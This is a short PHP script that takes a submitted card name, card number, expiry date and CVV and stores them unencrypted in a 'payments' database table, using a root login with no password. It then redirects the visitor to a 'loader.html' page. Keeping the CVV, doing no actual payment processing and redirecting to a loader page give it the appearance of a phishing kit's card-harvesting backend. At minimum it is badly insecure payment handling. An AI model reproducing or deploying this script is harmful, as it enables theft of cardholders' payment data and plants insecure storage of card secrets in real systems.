<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Connect to database
    $conn = new mysqli("localhost", "root", "", "your_db_name"); // Change your_db_name

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Get form data
    $card_name = $_POST['card_name'];
    $card_number = $_POST['card_number'];
    $exp_year = $_POST['exp_year'];
    $exp_month = $_POST['exp_month'];
    $cvv = $_POST['cvv'];

    // Prepare and execute insert query
    $stmt = $conn->prepare("INSERT INTO payments (card_name, card_number, exp_year, exp_month, cvv) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param("sssss", $card_name, $card_number, $exp_year, $exp_month, $cvv);

    if ($stmt->execute()) {
        // Redirect to loader.html after successful insertion
        header("Location: loader.html");
        exit();
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
    $conn->close();
}
?>
